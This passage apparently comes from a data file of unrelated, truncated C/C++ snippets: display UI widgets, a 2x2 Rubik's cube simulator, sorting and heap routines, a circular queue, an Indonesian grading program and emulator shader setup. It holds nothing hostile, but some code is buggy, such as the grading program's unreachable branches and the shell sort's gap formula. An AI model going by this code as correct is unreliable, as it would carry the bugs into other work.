\"DoubleRightTee;\"},\n    {0x021D1, 0x00000, 14, \"DoubleUpArrow;\"},\n    {0x021D5, 0x00000, 18, \"DoubleUpDownArrow;\"},\n    {0x02225, 0x00000, 18, \"DoubleVerticalBar;\"},\n    {0x02193, 0x00000, 10, \"DownArrow;\"},\n    {0x02913, 0x00000, 13, \"DownArrowBar;\"},\n    {0x021F5, 0x00000, ",
    "#include \"UiComponents.h\"\n\n\ndouble fmap(double x, double in_min, double in_max, double out_min, double out_max)\n{\n  double v = (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;\n  return fabs(v) < 1.0e-12 ? 0.0 : v;  // prevents exponential representation like -4.0957e-16\n}\n\n//                Text       Background  Border  Shadow  Font\nUiTheme blueTheme(TFT_BLACK, 0x07df,     0x03df, 0x01ca, &fonts::DejaVu12);\nUiTheme defaultTheme;\n\n\nvoid UiButton::draw()\n{\n    _lcd.drawRoundRect(_x+2, _y+2, _w, _h, _r, _theme._shadowColor);\n    _lcd.drawRoundRect(_x+1, _y+1, _w, _h, _r, _theme._shadowColor);\n    _lcd.fillRoundRect(_x, _y, _w, _h, _r, _theme._borderColor);\n    _lcd.fillRoundRect(_x+2, _y+2, _w-4, _h-4, _r, _theme._bodyColor);\n    _lcd.setTextDatum(textdatum_t::middle_center);\n    _lcd.setTextColor(_theme._textColor, _theme._bodyColor);\n    _lcd.setFont(_theme._font);\n    _lcd.drawString(_value, _x+_w/2, _y+2+_h/2);\n    _lcd.setTextDatum(textdatum_t::middle_left);\n    _lcd.setTextColor(_theme._textColor, _parent->getPanelColor());\n    _lcd.drawString(_label, _x+_w+_d, _y+2+_h/2);\n    \n}\n\nbool UiButton::touched(int x, int y)\n{\n    return (x > _x && x < _x+_w && y > _y && y < _y+_h);\n}\n\nvoid UiButton::clearValue()\n{\n    _value= \"\";\n    draw();\n}\n\nString UiButton::getValue() \n{\n    return _value;\n}\n\nvoid UiButton::getValue(String &value) \n{ \n    value = _value; \n}\n\nvoid UiButton::getValue(int &value) \n{ \n    value = _value.toInt(); \n}\n\nvoid UiButton::getValue(double &value) \n{ \n    value = _value.toDouble(); \n}\n\nString UiButton::getLabel() \n{\n    return(_label);\n}\n\nbool UiButton::rangeIsInteger() \n{ \n    return _rangeIsInteger; \n}\n\nbool UiButton::hasSlider() \n{ \n    return _pSlider != nullptr; \n}\n\nUiButton *UiButton::getSlider() \n{ \n    return _pSlider; \n}\n\n\nvoid UiButton::updateValue(String value)\n{\n    _value = value;\n    draw();\n}\n\nvoid UiButton::updateValue(int value)\n{\n    char buf[24];\n    if (_minInt!=0 || _maxInt!=0) // a range is set\n    {\n        if (value < _minInt) value = _minInt;  // limit the value to the range\n        if (value > _maxInt) value = _maxInt;\n    }\n    snprintf(buf, sizeof(buf), \"%d\", value);\n    _value = buf;\n    //log_i(\"Int value in %d, value out %s\", value, _value);\n    draw();\n}\n\nvoid UiButton::updateValue(double value)\n{\n    char buf[24];\n    if (_minDouble!=0.0 || _maxDouble!=0.0) // a range is set\n    {\n        if (value < _minDouble) value = _minDouble; // limit the value to the range\n        if (value > _maxDouble) value = _maxDouble;\n    }\n    snprintf(buf, sizeof(buf), \"%.10g\", value);\n    _value = buf;\n    //log_i(\"Double value in %.4g, value out %s\", value, _value);\n    draw();\n}\n\nvoid UiButton::setLabel(String label)\n{\n    _label = label;\n    draw(); //_lcd.drawString(_label, _x+_w+_d, _y+2+_h/2);\n}\n\nvoid UiButton::clearLabel()\n{\n    _lcd.setTextColor(_parent->getPanelColor());\n    _lcd.drawString(_label, _x+_w+_d, _y+2+_h/2);\n    _lcd.setTextColor(_theme._textColor); \n}\n\nvoid UiButton:: setRange(int min, int max)\n{\n    //log_i(\"Button setRange int %p\", this);\n    _minInt = min;\n    _maxInt = max;\n    _rangeIsInteger = true;\n}\n\nvoid UiButton:: setRange(double min, double max)\n{\n    //log_i(\"Button setRange double %p\", this);\n    _minDouble = min;\n    _maxDouble = max;\n    _rangeIsInteger = false;\n}\n\nvoid UiButton::addSlider(UiButton *btn)\n{\n    _pSlider = btn;\n}\n// --- UiButton ---\n\n\nvoid UiLed::draw()\n{\n    _lcd.fillCircle(_x+2, _y+2, _radius, _theme._shadowColor);\n    _lcd.fillCircle(_x, _y, _radius, _theme._borderColor);\n    _isOn ? _lcd.fillCircle(_x, _y, _radius-2, _color) : _lcd.fillCircle(_x, _y, _radius-2, _theme._bodyColor);\n    _lcd.setTextDatum(textdatum_t::middle_left);\n    _lcd.setTextColor(_theme._textColor);\n    _lcd.setFont(_theme._font);\n    _lcd.drawString(_label, _x+_radius*2+_d, _y);\n}\n\nbool UiLed::touched(int x, int y)\n{\n    return (x > _x-_radius && x < _x+_radius && y > _y-_radius && y < _y+_radius);\n}\n\nvoid UiLed::setLabel(String txt)\n{\n    _label = txt;\n    draw();     \n}\n\nbool UiLed::isOn()\n{\n    return _isOn;\n}\n\nvoid UiLed::on()\n{\n    if (! _isOn)\n    {\n        _lcd.fillCircle(_x, _y, _radius-2, _color);\n        _isOn = true;\n    }\n}  \n\nvoid UiLed::off()\n{\n    if (_isOn)\n    {\n        _lcd.fillCircle(_x, _y, _radius-2, _theme._bodyColor);\n        _isOn = false;\n    }\n} \n    \nvoid UiLed::toggle()\n{\n    if (_isOn)\n    {\n        _lcd.fillCircle(_x, _y, _radius-2, _theme._bodyColor);\n        _isOn = false;\n    }\n    else\n    {\n        _lcd.fillCircle(_x, _y, _radius-2, _color);\n        _isOn = true;\n    }\n}\n// --- UiLed ---\n\n\nvoid UiHslider::draw()\n{\n    _lcd.drawRoundRect(_x+2, _y+2, _w, _h, _r, _theme._shadowColor);\n    _lcd.drawRoundRect(_x+1, _y+1, _w, _h, _r, _theme._shadowColor);\n    _lcd.fillRoundRect(_x, _y, _w, _h, _r, _theme._borderColor);\n    _lcd.fillRoundRect(_x+2, _y+2, _w-4, _h-4, _r, _theme._bodyColor);\n    _lcd.fillCircle(_position, _y+_h/2, _rb, _color);\n    _lcd.drawCircle(_position, _y+_h/2, _rb, _theme._border",
    "#include<bits/stdc++.h>\nusing namespace std;\nusing Face = vector<vector<char>>;\nunordered_map<string, Face> leer_caras_cubo() {\n    unordered_map<char, string> mapa_color = {\n        {'V', \"Verde\"},\n        {'A', \"Amarillo\"},\n        {'N', \"Naranja\"},\n        {'R', \"Rojo\"},\n        {'B', \"Blanco\"},\n        {'C', \"Celeste\"}\n    };\n    unordered_map<string, Face> cubo;\n    for (const auto& pair : mapa_color) {\n        char inicial_de_la_cara = pair.first;\n        Face face(2, vector<char>(2, inicial_de_la_cara));\n        cubo[pair.second] = face;\n    }\n    return cubo;\n}\nFace rotacion_horaria(const Face& face) {\n    Face cara_rotada(2, vector<char>(2));\n    for (int fil = 0; fil < 2; ++fil) {\n        for (int col = 0; col < 2; ++col) {\n            cara_rotada[col][1 - fil] = face[fil][col];\n        }\n    }\n    return cara_rotada;\n}\nFace rotacion_antihoraria(const Face& face){\n    Face cara_rotada(2, vector<char>(2));\n    for (int fil = 0; fil < 2; ++fil) {\n        for (int col = 0; col < 2; ++col) {\n            cara_rotada[fil][col] = face[col][1 - fil];\n        }\n    }\n    return cara_rotada;\n}\nvoid R(unordered_map<string, Face>& cubo) {\n    cubo[\"Naranja\"] = rotacion_horaria(cubo[\"Naranja\"]); \n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Verde\"][i][1];\n    }\n    cubo[\"Verde\"][0][1] = cubo[\"Blanco\"][0][1];   \n    cubo[\"Verde\"][1][1] = cubo[\"Blanco\"][1][1];  \n    cubo[\"Blanco\"][0][1] = cubo[\"Celeste\"][1][0]; \n    cubo[\"Blanco\"][1][1] = cubo[\"Celeste\"][0][0]; \n    cubo[\"Celeste\"][0][0] = cubo[\"Amarillo\"][1][1];  \n    cubo[\"Celeste\"][1][0] = cubo[\"Amarillo\"][0][1];  \n    cubo[\"Amarillo\"][0][1] = tmp[0];  \n    cubo[\"Amarillo\"][1][1] = tmp[1];  \n}\nvoid Rp(unordered_map<string, Face>& cubo) {\n    cubo[\"Naranja\"] = rotacion_antihoraria(cubo[\"Naranja\"]);\n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Verde\"][i][1];\n    }\n    cubo[\"Verde\"][0][1] = cubo[\"Amarillo\"][0][1];  \n    cubo[\"Verde\"][1][1] = cubo[\"Amarillo\"][1][1];  \n    cubo[\"Amarillo\"][0][1] = cubo[\"Celeste\"][1][0];  \n    cubo[\"Amarillo\"][1][1] = cubo[\"Celeste\"][0][0];\n    cubo[\"Celeste\"][0][0] = cubo[\"Blanco\"][1][1];\n    cubo[\"Celeste\"][1][0] = cubo[\"Blanco\"][0][1];\n    cubo[\"Blanco\"][0][1] = tmp[0];  \n    cubo[\"Blanco\"][1][1] = tmp[1]; \n}\nvoid L(unordered_map<string, Face>& cubo) {\n    cubo[\"Rojo\"] = rotacion_horaria(cubo[\"Rojo\"]); \n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Verde\"][i][0];\n    }\n    cubo[\"Verde\"][0][0] = cubo[\"Amarillo\"][0][0];\n    cubo[\"Verde\"][1][0] = cubo[\"Amarillo\"][1][0];\n    cubo[\"Amarillo\"][0][0] = cubo[\"Celeste\"][1][1];  \n    cubo[\"Amarillo\"][1][0] = cubo[\"Celeste\"][0][1];  \n    cubo[\"Celeste\"][0][1] = cubo[\"Blanco\"][1][0];\n    cubo[\"Celeste\"][1][1] = cubo[\"Blanco\"][0][0];  \n    cubo[\"Blanco\"][0][0] = tmp[0]; \n    cubo[\"Blanco\"][1][0] = tmp[1]; \n}\nvoid Lp(unordered_map<string, Face>& cubo) {\n    cubo[\"Rojo\"] = rotacion_antihoraria(cubo[\"Rojo\"]);  \n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Verde\"][i][0];\n    }\n    cubo[\"Verde\"][0][0] = cubo[\"Blanco\"][0][0];  \n    cubo[\"Verde\"][1][0] = cubo[\"Blanco\"][1][0];  \n    cubo[\"Blanco\"][0][0] = cubo[\"Celeste\"][1][1];\n    cubo[\"Blanco\"][1][0] = cubo[\"Celeste\"][0][1];\n    cubo[\"Celeste\"][0][1] = cubo[\"Amarillo\"][1][0]; \n    cubo[\"Celeste\"][1][1] = cubo[\"Amarillo\"][0][0]; \n    cubo[\"Amarillo\"][0][0] = tmp[0]; \n    cubo[\"Amarillo\"][1][0] = tmp[1]; \n\n} \nvoid F(unordered_map<string, Face>& cubo) {\n    cubo[\"Verde\"] = rotacion_horaria(cubo[\"Verde\"]);\n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Naranja\"][i][0];\n    }\n    for (int i = 0; i < 2; ++i) {\n        cubo[\"Naranja\"][i][0] = cubo[\"Amarillo\"][1][i]; \n    }\n    cubo[\"Amarillo\"][1][0] = cubo[\"Rojo\"][1][1];\n    cubo[\"Amarillo\"][1][1] = cubo[\"Rojo\"][0][1];\n    for (int i = 0; i < 2; ++i) {\n        cubo[\"Rojo\"][i][1] = cubo[\"Blanco\"][0][i];\n    }\n    cubo[\"Blanco\"][0][0] = tmp[1];\n    cubo[\"Blanco\"][0][1] = tmp[0];\n}\nvoid Fp(unordered_map<string, Face>& cubo) {\n    cubo[\"Verde\"] = rotacion_antihoraria(cubo[\"Verde\"]);\n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Naranja\"][i][0];\n    }\n    cubo[\"Naranja\"][0][0]=cubo[\"Blanco\"][0][1];\n    cubo[\"Naranja\"][1][0]=cubo[\"Blanco\"][0][0];\n    cubo[\"Blanco\"][0][0]=cubo[\"Rojo\"][0][1];\n    cubo[\"Blanco\"][0][1]=cubo[\"Rojo\"][1][1];\n    cubo[\"Rojo\"][0][1]=cubo[\"Amarillo\"][1][1];\n    cubo[\"Rojo\"][1][1]=cubo[\"Amarillo\"][1][0];\n    cubo[\"Amarillo\"][1][0]=tmp[0];\n    cubo[\"Amarillo\"][1][1]=tmp[1];\n}\nvoid B(unordered_map<string, Face>& cubo){\n    cubo[\"Celeste\"] = rotacion_horaria(cubo[\"Celeste\"]);\n    vector<char> tmp(2);\n    for (int i = 0; i < 2; ++i) {\n        tmp[i] = cubo[\"Naranja\"][i][1];\n    }\n    cubo[\"Naranja\"][0][1] = cubo[\"Blanco\"][1][1];\n    cubo[\"Naranja\"][1][1] = cubo[\"Blanco\"][1][0];\n    cubo[\"Blanco\"][1][0] = cubo[\"Rojo\"][0][0];\n    cubo[\"Blanco\"][1][1] = cubo[\"Rojo\"][1][0];\n    cub",
    "#include <bits/stdc++.h>\r\n#define MAXSIZE 10\r\nusing namespace std;\r\n\r\nvoid iniArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = rand() % 20;\r\n\t}\r\n}\r\n\r\nvoid showArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcout << arr[i] << \" \";\r\n\t}\r\n\tcout << endl << \"------------\";\r\n}\r\n\r\n//\u5192\u6ce1\u6392\u5e8f\r\nvoid bubSort(int arr[], int length) {\r\n\twhile (length--)\r\n\t{\r\n\t\tfor (int i = 0; i < length; i++) {\r\n\t\t\tif (arr[i + 1] < arr[i]) {\r\n\t\t\t\tint temp = arr[i + 1];\r\n\t\t\t\tarr[i + 1] = arr[i];\r\n\t\t\t\tarr[i] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//\u9009\u62e9\u6392\u5e8f\r\nvoid selectSort(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tint k = i;\r\n\t\tfor (int j = i + 1; j < length; j++) {\r\n\t\t\tif (arr[j] < arr[k]) {\r\n\t\t\t\tk = j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tint temp = arr[i];\r\n\t\tarr[i] = arr[k];\r\n\t\tarr[k] = temp;\r\n\r\n\t}\r\n}\r\n\r\n\r\n//\u63d2\u5165\u6392\u5e8f\r\nvoid insertSort(int arr[], int length) {\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint key = arr[i];\r\n\t\tint j = i - 1;\r\n\r\n\t\t// \u5c06\u5143\u7d20arr[i]\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u7684\u5e8f\u5217arr[0..i-1]\u4e2d  \r\n\t\twhile (j >= 0 && arr[j] > key) {\r\n\t\t\tarr[j + 1] = arr[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tarr[j + 1] = key;\r\n\t}\r\n}\r\n\r\n//\u63d2\u5165\u65b0\u7684\u5143\u7d20\r\nvoid insertElement(int arr[], int length, int newElement) {\r\n\tint i;\r\n\tfor (i = length - 1; (i >= 0 && arr[i] > newElement); i--) {\r\n\t\tarr[i + 1] = arr[i]; // \u5c06\u5143\u7d20\u5411\u540e\u79fb\u52a8  \r\n\t}\r\n\tarr[i + 1] = newElement; // \u63d2\u5165\u65b0\u5143\u7d20  \r\n\r\n\t// \u6ce8\u610f\uff1a\u7531\u4e8e\u6570\u7ec4\u5927\u5c0f\u56fa\u5b9a\uff0c\u8fd9\u91cc\u7684\u201c\u63d2\u5165\u201d\u5b9e\u9645\u4e0a\u662f\u8986\u76d6\u4e86\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002  \r\n\t// \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u5206\u914d\u6570\u7ec4\u7684\u5927\u5c0f\u6765\u771f\u6b63\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002  \r\n}\r\n\r\n//\u5e0c\u5c14\u6392\u5e8f\r\nvoid shellSort(int arr[], int length) {\r\n\tint h = 1;\r\n\tint t = length / 3;\r\n\twhile (h<t)\r\n\t{\r\n\t\th = 3 * h - 1;\r\n\t}\r\n\twhile (h >= 1) {\r\n\t\tfor (int i = h; i < length; i++) {\r\n\t\t\tfor (int j = i; j >= h && arr[j] < arr[j - h]; j--) {\r\n\t\t\t\tint temp = arr[j];\r\n\t\t\t\tarr[j] = arr[j - h];\r\n\t\t\t\tarr[j - h] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t\th /= 3;\r\n\t}\r\n}\r\n\r\n//\u5feb\u901f\u6392\u5e8f\r\nvoid quickSort(int arr[], int left, int right) {\r\n\tif (left >= right) {\r\n\t\treturn;\r\n\t}\r\n\tint i = left;\r\n\tint j = right;\r\n\tint pivot = arr[i];\r\n\twhile (i < j)\r\n\t{\r\n\t\twhile (i < j && arr[j] >= pivot)\r\n\t\t\tj--;\r\n\t\t\tarr[i] = arr[j];\r\n\t\twhile (i < j && arr[i] <= pivot)\r\n\t\t\t\t\ti++;\r\n\t\t\tarr[j] = arr[i];\r\n\t}\r\n\t//\u5f53j=i\u65f6\uff0c\u8f74\u786e\u5b9a\r\n\tarr[i] = pivot;\r\n\tquickSort(arr, left, i - 1);\r\n\tquickSort(arr, i + 1, right);\r\n}\r\n\r\n//\u5f52\u5e76\u6392\u5e8f\r\n//\u9ed8\u8ba4\u5e8f\u5217a\u4e0e\u5e8f\u5217b\u90fd\u662f\u6709\u5e8f\u5e8f\u5217\r\nvoid mergesort1(int aArr[], int alen, int bArr[], int blen, int* temp) {\r\n\tint i = 0;\r\n\tint j = 0;\r\n\tint k = 0;\r\n\twhile (i < alen && j < blen)\r\n\t{\r\n\t\t//\u4f7f\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\r\n\t\ttemp[k++] = aArr[i] < bArr[j] ? aArr[i++] : bArr[j++];\r\n\t}\r\n\twhile (i < alen)\r\n\t{\r\n\t\ttemp[k++] = aArr[i++];\r\n\t}\r\n\twhile (j < blen)\r\n\t{\r\n\t\ttemp[k++] = bArr[j++];\r\n\t}\r\n}\r\n\r\n//\u65e0\u5e8f\u5e8f\u5217\uff0c\u5c06\u5176\u62c6\u5206\u5f00\uff0c\u8ba9\u5176\u6210\u4e3a\u6709\u5e8f\u7684\u591a\u4e2a\u5e8f\u5217\r\nvoid merge(int arr[], int low, int mid, int higth, int* temp) {\r\n\tint i = low;\r\n\tint j = mid + 1;\r\n\tint k = low;\r\n\twhile (i <= mid && j <= higth)\r\n\t{\r\n\t\ttemp[k++] = arr[i] < arr[j] ? arr[i++] : arr[j++];\r\n\t}\r\n\twhile (i <= mid) {\r\n\t\ttemp[k++] = arr[i++];\r\n\t}\r\n\twhile (j <= higth) {\r\n\t\ttemp[k++] = arr[j++];\r\n\t}\r\n\tfor (i = low; i <= higth; i++) {\r\n\t\tarr[i] = temp[i];\r\n\t}\r\n}\r\n\r\nvoid merge_sort(int arr[], int low, int higth, int* temp) {\r\n\tif (low >= higth) {\r\n\t\treturn;\r\n\t}\r\n\tint mid = low + (higth - low) / 2;//(low+higth)/2;\r\n\tmerge_sort(arr, low, mid, temp);\r\n\tmerge_sort(arr, mid + 1, higth, temp);\r\n\tmerge(arr, low, mid, higth, temp);\r\n}\r\n\r\nvoid mergesort2(int arr[], int length) {\r\n\tint* temp = new int[length];\r\n\tassert(temp);\r\n\tmerge_sort(arr, 0, length - 1, temp);\r\n\tdelete[] temp;\r\n}\r\n\r\n//\u5165\u5806\uff08\u5185\u5806\uff09\r\nvoid pushHeap(int* heap, int& size, int data) {\r\n\theap[size] = data;\r\n\tint current = size;\r\n\tint parent = (current - 1) / 2;\r\n\twhile (current > 0 && heap[current] < heap[parent]) {\r\n\t\tswap(heap[current], heap[parent]);\r\n\t\tcurrent = parent;\r\n\t\tparent = (current - 1) / 2;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//\u51fa\u5806\uff08\u5185\u5806\uff09\r\nint popHeap(int* heap, int& size) {\r\n\tint val = heap[0];\r\n\theap[0] = heap[size - 1];\r\n\tsize--;\r\n\tint current = 0;\r\n\tint child = 2 * current + 1;\r\n\twhile (child < size) {\r\n\t\tif (child + 1 < size && heap[child + 1] < heap[child])\r\n\t\t\tchild++;\r\n\t\tif (heap[child] >= heap[current])\r\n\t\t\tbreak;\r\n\t\tswap(heap[child], heap[current]);\r\n\t\tcurrent = child;\r\n\t\tchild = 2 * current + 1;\r\n\t}\r\n\treturn val;\r\n}\r\n\r\n//\u5806\u6392\u5e8f\u5b9e\u73b0\uff08\u5185\u5806\uff09\r\nvoid heapsort1(int* arr, int length) {\r\n\tint* heap = new int[length];\r\n\tint heapSize = 0;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tpushHeap(heap, heapSize, arr[i]);\r\n\t}\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = popHeap(heap, heapSize);\r\n\t}\r\n\tdelete[] heap;\r\n}\r\n\r\n// \u8c03\u6574\u5806\uff08\u5916\u5806\uff09\r\nvoid heapify(int arr[], int n, int i) {\r\n\tint largest = i;  // \u521d\u59cb\u5316\u6700\u5927\u5143\u7d20\u4e3a\u6839\u8282\u70b9\r\n\tint left = 2 * i + 1;  // \u5de6\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\tint right = 2 * i + 2;  // \u53f3\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\r\n\t// \u5982\u679c\u5de6\u5b50\u8282\u70b9\u5927\u4e8e\u6839\u8282\u70b9\r\n\tif (left < n && arr[left] > arr[largest]) {\r\n\t\tlargest = left;\r\n\t}\r\n\r\n\t// \u5982\u679c\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5f53\u524d\u6700\u5927\u8282\u70b9\r\n\tif (right < n && arr[right] > arr[largest]) {\r\n\t\tlargest = right;\r\n\t}\r\n\r\n\t// \u5982\u679c\u6700\u5927\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\r\n\tif (largest != i) {\r\n\t\tswap(arr[i], arr[largest]);\r\n\t\t// \u9012\u5f52\u8c03\u6574\u5b50\u6811\r\n\t\theapify(arr, n, largest);\r\n\t}\r\n}\r\n\r\n// \u5806\u6392\u5e8f\uff08\u5916\u5806\uff09\r\nvoid heapSort(int arr[], int n) {\r\n\t// \u6784\u5efa\u6700\u5927\u5806\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff09\r\n\tfor (int i = n / 2 - 1; i >= 0; i--) {\r\n\t\theapify(arr, n, i);\r\n\t}\r\n\r\n\t// \u9010\u4e2a\u4ece\u5806\u9876\u53d6\u51fa\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u533a\u95f4\u672b\u5c3e\r\n\tfor (int i = n - 1; i > ",
    "#include<iostream>\r\n\r\n#include<stack>\r\n\r\nusing namespace std;\r\n\r\nint cqueue[5];\r\nint front= -1, rear =-1, n=5;\r\n\r\nvoid insertcq(int val)\r\n{\r\n    if ((front == 0 && rear == n-1 ) || (front == rear+1))\r\n    {\r\n        cout<<\"Queue is overflow \\n\";\r\n        return;\r\n    }\r\n    if(front == -1)\r\n    {\r\n        front = 0;\r\n        rear = 0; \r\n    }\r\n    else \r\n    {\r\n        rear =rear+1;\r\n    }\r\ncqueue[rear] = val ;\r\n}\r\n// sgegfiwhwihilu\r\nvoid deletecq()\r\n{\r\n    if (front == -1 )\r\n    {\r\n        cout<<\"Queue underflow \\n\";\r\n        return;\r\n    }\r\n    cout<<\"Element deleted fom queue is : \"<<cqueue[front]<<endl;\r\n\r\n    if (front == rear )\r\n    {\r\n        front = -1;\r\n        rear = -1;\r\n    }\r\n    else\r\n    {\r\n        if(front == n-1)\r\n        {\r\n            front=0;\r\n        }\r\n        else\r\n        {\r\n            front = front +1;\r\n        }\r\n    }\r\n}\r\n\r\nvoid displaycq()\r\n{\r\n    int f =front , r =rear;\r\n    if (front == -1)\r\n    {\r\n        cout<<\" Queue is empty\"<<endl;\r\n        return;\r\n    }\r\n    cout<<\"Queue Elements are : \\n\";\r\n\r\n    if(f <= r)\r\n    {\r\n        while(f <= r)\r\n        {\r\n            cout<<cqueue[f]<<\" \";\r\n            f++;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        while (f <=n - 1 )\r\n        {\r\n            cout<<cqueue[f]<<\" \";\r\n            f++;\r\n        }\r\n        f=0;\r\n        while(f <=r)\r\n        {\r\n            cout<<cqueue[f]<<\" \";\r\n            f++;\r\n        }\r\n    }\r\n    cout<<endl;\r\n}\r\n\r\nint main()\r\n{\r\n    int ch, val;\r\n    cout<<\"1) Insert \\n \";\r\n    cout<<\"2) Delete \\n\";\r\n    cout<<\"3) Display\\n\";\r\n    cout<<\"4) Exit \\n\";\r\n\r\n    do\r\n    {\r\n        cout<<\"Input for insertion :\" <<endl;\r\n        cin>>ch;\r\n\r\n        switch(ch)\r\n        {\r\n            case 1:\r\n            cout<<\" Insert for insertion :\"<<endl;\r\n            cin>>val;\r\n            insertcq(val);\r\n            break;\r\n\r\n            case 2:\r\n            deletecq();\r\n            break;\r\n\r\n            case 3:\r\n            displaycq();\r\n            break;\r\n\r\n            case 4:\r\n            cout<<\"Exit \\n\";\r\n            break;\r\n\r\n            default:\r\n            cout<<\"Incorrect ! \\n\";\r\n        }\r\n    } while (ch !=4);\r\n\r\n    return 0;\r\n    \r\n\r\n\r\n\r\n}",
    "#include <iostream>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include <string>\r\n using namespace std;\r\n  int main(){\r\n  \t\r\n  \t  system(\"COLOR 2\");\r\n  \t  \r\n  \t  cout<<\"SISTEM PENENTU KENAIKAN SISWA\"<<endl;\r\n  \t   for (int j = 0; j < 3; j++) {\r\n  \t   \t cout<<\".\";\r\n  \t   \t sleep(1);\r\n\t\t }\r\n  \t  \r\n\t\tint kkm;\r\n  \t  cout<<\"\\n mohon masukan nilai kkm = \"<<endl;\r\n  \t  cin>> kkm;\r\n  \t  \r\n  \t  \r\n  \t  for (int b = 0; b < 4; b++) {\r\n\t\t\r\n  \t  cout<<\".\";\r\n  \t  sleep(1);\r\n  \t  \r\n  }\r\n  \r\n  \t  \r\n  \t  string nama;\r\n  \t  cout<<\"\\n masukan nama siswa = \"<<endl;\r\n  \t  cin>> nama;\r\n  \t  \r\n  \t  int nilai;\r\n  \t  while (true) {\r\n  \t  cout<<\"masukan nilai siswa = \"<<endl;\r\n  \t  cin>> nilai;\r\n  \t  \r\n  \t cout<<\"menentukan........\\n\"<<endl;\r\n  \t for (int i = 0; i < 5; i++) {\r\n    cout << \".\";\r\n    Sleep(200);\r\n    }\r\n    \r\n    \r\n    if ( nilai >= kkm) {\r\n    \tcout<< nama << \" SELAMAT DI NYATAKAN NAIK KELAS!!\"<<endl;\r\n    \t\r\n\t}\r\n\t  else if ( nilai == kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN NAIK  KELAS!!\"<<endl;\r\n\t  \tcout<< \"anda berada di kkm pas. terus belajar!!\"<<endl;\r\n\t  }\r\n\t  \r\n\t  else if ( nilai != kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN TINNGAL KELAS!!\"<<endl;\r\n\t  \tcout<< \" belajar yang rajin :)\"<<endl;\r\n    }\r\n\t   else  {\r\n\t   \tcout<<\"EROR 455 RETRY AGAIN\"<<endl;\r\n\t   }\r\n\t  \r\n\t  sleep(10);\r\n\t  system(\"CLS\");\r\n\t  \r\n\t  cout<<\"\\nSoftware ini di buat oleh CaitroniaDev. Free open-scoure 2024\"<<endl;\r\n\t  \r\n\t  return 0;\r\n  }\r\n}\r\n",
    "// SPDX-FileCopyrightText: Copyright 2023 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/settings.h\"\n#include \"video_core/fsr.h\"\n#include \"video_core/host_shaders/ffx_a_h.h\"\n#include \"video_core/host_shaders/ffx_fsr1_h.h\"\n#include \"video_core/host_shaders/full_screen_triangle_vert.h\"\n#include \"video_core/host_shaders/opengl_fidelityfx_fsr_easu_frag.h\"\n#include \"video_core/host_shaders/opengl_fidelityfx_fsr_frag.h\"\n#include \"video_core/host_shaders/opengl_fidelityfx_fsr_rcas_frag.h\"\n#include \"video_core/renderer_opengl/gl_shader_manager.h\"\n#include \"video_core/renderer_opengl/gl_shader_util.h\"\n#include \"video_core/renderer_opengl/present/fsr.h\"\n#include \"video_core/renderer_opengl/present/util.h\"\n\nnamespace OpenGL {\nusing namespace FSR;\n\nusing FsrConstants = std::array<u32, 4 * 4>;\n\nFSR::FSR(u32 output_width_, u32 output_height_) : width(output_width_), height(output_height_) {\n    std::string fsr_source{HostShaders::OPENGL_FIDELITYFX_FSR_FRAG};\n    ReplaceInclude(fsr_source, \"ffx_a.h\", HostShaders::FFX_A_H);\n    ReplaceInclude(fsr_source, \"ffx_fsr1.h\", HostShaders::FFX_FSR1_H);\n\n    std::string fsr_easu_source{HostShaders::OPENGL_FIDELITYFX_FSR_EASU_FRAG};\n    std::string fsr_rcas_source{HostShaders::OPENGL_FIDELITYFX_FSR_RCAS_FRAG};\n    ReplaceInclude(fsr_easu_source, \"opengl_fidelityfx_fsr.frag\", fsr_source);\n    ReplaceInclude(fsr_rcas_source, \"opengl_fidelityfx_fsr.frag\", fsr_source);\n\n    vert = CreateProgram(HostShaders::FULL_SCREEN_TRIANGLE_VERT, GL_VERTEX_SHADER);\n    easu_frag = CreateProgram(fsr_easu_source, GL_FRAGMENT_SHADER);\n    rcas_frag = CreateProgram(fsr_rcas_source, GL_FRAGMENT_SHADER);\n\n    glProgramUniform2f(vert.handle, 0, 1.0f, -1.0f);\n    glProgramUniform2f(vert.handle, 1, 0.0f, 1.0f);\n\n    sampler = 